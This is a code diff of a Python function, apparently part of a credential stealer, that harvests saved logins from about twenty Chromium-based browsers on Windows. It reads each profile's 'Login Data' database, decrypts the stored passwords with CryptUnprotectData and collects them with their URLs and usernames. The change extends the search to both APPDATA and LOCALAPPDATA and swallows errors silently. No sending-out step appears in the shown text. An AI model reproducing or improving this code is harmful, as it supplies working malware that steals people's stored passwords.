@@ -14,22 +14,22 @@ def passwordsRecovery():
 	passwords    = {}
 	passwords_i  = 0
 	# Variables
-	appdata    = getenv("LOCALAPPDATA") + '\\'
+	local_appdata = getenv("LOCALAPPDATA") + '\\'
+	appdata       = getenv("APPDATA") + '\\'
 	login_data = '\\Login Data'
 	# Browsers list
-	browsers = [
-		'Google\\Chrome\\User Data\\Default',
+	browsers   = [
+		"Google\\Chrome\\User Data\\Default",
 		"Google(x86)\\Chrome\\User Data\\Default",
-		'Chromium\\User Data\\Default',
-		'Opera Software\\Opera Stable',
-		'Amigo\\User Data\\Default',
-		'Vivaldi\\User Data\\Default',
-		'Orbitum\\User Data\\Default',
-		'Mail.Ru\\Atom\\User Data\\Default',
+		"Chromium\\User Data\\Default",
+		"Opera Software\\Opera Stable",
+		"Amigo\\User Data\\Default",
+		"Vivaldi\\User Data\\Default",
+		"Orbitum\\User Data\\Default",
+		"Mail.Ru\\Atom\\User Data\\Default",
 		"Kometa\\User Data\\Default",
 		"Comodo\\Dragon\\User Data\\Default",
 		"Torch\\User Data\\Default",
-		"Yandex\\YandexBrowser\\User Data\\Default",
 		"Comodo\\User Data\\Default",
 		"360Browser\\Browser\\User Data\\Default",
 		"Maxthon3\\User Data\\Default",
@@ -38,7 +38,8 @@ def passwordsRecovery():
 		"Nichrome\\User Data\\Default",
 		"CocCoc\\Browser\\User Data\\Default",
 		"Uran\\User Data\\Default",
-		"Chromodo\\User Data\\Default"
+		"Chromodo\\User Data\\Default",
+		"Yandex\\YandexBrowser\\User Data\\Default"
 	]
 	# Get passwords from chromium based browsers
 	def getPasswords(db, sql = 'SELECT action_url, username_value, password_value FROM logins'):
@@ -54,14 +55,18 @@ def passwordsRecovery():
 			except:
 				pass
 			else:
-				for result in cursor.fetchall():
-					url      = result[0]
-					login    = result[1]
-					password = CryptUnprotectData(result[2])[1].decode()
-					if password != '':
-						passwords_i += 1
-						passwords[passwords_i] = {'url': url, 'login': login, 'password': password}
+				try:
+					for result in cursor.fetchall():
+						url      = result[0]
+						login    = result[1]
+						password = CryptUnprotectData(result[2])[1].decode()
+						if password != '':
+							passwords_i += 1
+							passwords[passwords_i] = {'url': url, 'login': login, 'password': password}
+				except:
+					pass
 
 	for browser in browsers:
 		getPasswords(appdata + browser + login_data)
+		getPasswords(local_appdata + browser + login_data)
 	return passwords.items()
